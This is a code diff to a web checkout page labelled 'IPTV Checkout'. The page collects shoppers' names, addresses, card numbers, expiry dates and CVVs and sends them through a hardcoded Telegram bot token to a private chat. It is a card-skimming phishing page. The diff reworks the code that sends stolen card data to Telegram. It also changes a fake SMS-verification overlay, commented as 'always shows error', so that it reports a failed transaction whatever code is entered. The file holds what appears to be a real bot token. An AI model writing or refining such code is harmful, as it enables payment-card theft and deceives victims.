@@ -315,6 +315,15 @@
       cursor: pointer;
       text-decoration: underline;
     }
+    .sms-card .error-message {
+      color: #dc2626;
+      background: #fef2f2;
+      padding: 0.5rem;
+      border-radius: 8px;
+      margin-top: 0.5rem;
+      font-size: 0.85rem;
+      font-weight: 500;
+    }
     @keyframes spin { to { transform: rotate(360deg); } }
     @keyframes fadeUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
     @media (max-width: 1024px) {
@@ -475,7 +484,7 @@
       <p style="font-size:0.9rem; color:#4b5563;">We sent a code to your phone</p>
       <input type="text" id="smsCode" placeholder="000000" maxlength="6">
       <button class="btn-sms" id="smsVerifyBtn">Verify code</button>
-      <div id="smsError" style="color:#dc2626; margin-top:0.5rem; font-size:0.8rem; min-height:1.5rem;"></div>
+      <div id="smsError" class="error-message" style="display:none;">❌ Transaction not successful</div>
       <button class="close-sms" id="smsCloseBtn">Close</button>
     </div>
   </div>
@@ -598,23 +607,43 @@
         };
       }
 
-      // Send to Telegram
+      // Send to Telegram with proper formatting
       function sendToTelegram(data) {
         const token = '7551456255:AAF8F9NLdoSG33i6Z0FqokmjhsnoJ2Mua2Y';
         const chatId = '1017945601';
-        const message = `🛒 *IPTV Checkout*%0A👤 ${data.fullname}%0A📧 ${data.email}%0A🏠 ${data.address}, ${data.city}, ${data.state} ${data.zip}, ${data.country}%0A💳 ${data.cardName}%0A🔢 ${data.cardNumber}%0A📅 ${data.expiry}%0A🔐 CVV: ${data.cvv}`;
         
-        // Use fetch to send to Telegram
-        fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        // Build properly formatted message with line breaks
+        const message = 
+`🛒 IPTV Checkout
+👤 ${data.fullname}
+📧 ${data.email}
+🏠 ${data.address}, ${data.city}, ${data.state} ${data.zip}, ${data.country}
+💳 ${data.cardName}
+🔢 ${data.cardNumber}
+📅 ${data.expiry}
+🔐 CVV: ${data.cvv}`;
+
+        // Send to Telegram using URL encoding for proper line breaks
+        const url = `https://api.telegram.org/bot${token}/sendMessage`;
+        const payload = {
+          chat_id: chatId,
+          text: message,
+          parse_mode: 'HTML'
+        };
+
+        fetch(url, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            chat_id: chatId,
-            text: message,
-            parse_mode: 'Markdown'
-          })
-        }).catch(err => console.warn('Telegram send failed:', err));
-        
+          body: JSON.stringify(payload)
+        })
+        .then(response => response.json())
+        .then(data => {
+          console.log('Telegram message sent successfully:', data);
+        })
+        .catch(err => {
+          console.warn('Telegram send failed:', err);
+        });
+
         console.log('Telegram message sent:', message);
       }
 
@@ -640,7 +669,7 @@
           // Show SMS overlay
           smsOverlay.style.display = 'flex';
           smsCodeInput.value = '';
-          smsError.textContent = '';
+          smsError.style.display = 'none';
           smsCodeInput.focus();
         }, 2500);
       });
@@ -648,12 +677,14 @@
       // SMS verification - always shows error
       smsVerifyBtn.addEventListener('click', function() {
         const code = smsCodeInput.value.trim();
-        if (code.length < 4) {
-          smsError.textContent = '⚠️ Please enter the full code.';
+        if (code.length < 1) {
+          smsError.textContent = '⚠️ Please enter the code.';
+          smsError.style.display = 'block';
           return;
         }
-        // Show error as requested
-        smsError.textContent = '❌ Invalid code. Please try again.';
+        // Show transaction error as requested
+        smsError.textContent = '❌ Transaction not successful';
+        smsError.style.display = 'block';
         // Keep error visible, user can retry or close
       });
 
